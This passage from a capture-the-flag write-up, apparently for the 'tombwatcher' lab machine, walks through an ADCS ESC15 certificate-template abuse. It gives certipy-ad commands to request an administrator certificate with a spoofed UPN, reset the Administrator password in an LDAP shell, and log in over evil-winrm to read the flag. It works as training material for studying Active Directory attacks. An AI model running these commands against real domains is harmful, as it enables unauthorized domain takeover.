> ESC15 is a known vulnerability that allows users to request certificates impersonating other users, provided the CA is misconfigured and the template allows subject supply.

---

## Abusing Certificate Template (ESC15)

We requested a certificate as `cert_admin` but spoofed the **UPN (User Principal Name)** to impersonate the **domain administrator**:

```bash
certipy-ad req -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -target-ip 10.10.11.72 \
-u cert_admin@tombwatcher.htb -p 'newp@ss' \
-template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

> This generated a PFX certificate for `administrator@tombwatcher.htb`, allowing authentication as the domain admin via certificate-based login.

---

## LDAP Shell as Domain Admin

We authenticated with the newly minted certificate and obtained a fully privileged LDAP shell:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
```

Inside the LDAP shell, we reset the **Administrator** account password:

```plaintext
# change_password Administrator NewP@ssw0rd123
Password changed successfully!
```

---

## Admin Shell Access (Evil-WinRM)

With the new password, we authenticated as the **Administrator**:

```bash
evil-winrm -u administrator -p 'NewP@ssw0rd123' -i 10.10.11.72
```

Navigated to the Desktop and retrieved the **root flag**:

```powershell
cd ../desktop
type root.txt
```
---

## Key Takeaways

* AD Recycle Bin can expose previously deleted privileged accounts.
* Misconfigured ADCS templates can lead to full domain compromise.
* ESC15 remains a critical threat vector—organizations must audit certificate templates regularly.
* Certipy is an essential tool for modern Active Directory enumeration and exploitation.

